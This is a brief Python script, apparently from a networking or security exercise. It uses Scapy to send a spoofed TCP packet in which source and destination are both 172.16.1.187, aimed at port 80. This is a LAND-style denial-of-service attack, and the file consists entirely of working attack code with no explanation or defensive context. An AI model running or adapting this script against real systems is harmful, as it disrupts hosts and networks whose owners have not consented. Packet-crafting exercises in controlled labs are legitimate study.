from scapy.all import *

conf.L3socket
conf.L3socket=L3RawSocket

target = "172.16.1.187"

i = IP()
i.src = target
i.dst = target
t = TCP()
t.sport = 1001
t.dport = 80
send(i/t)
 
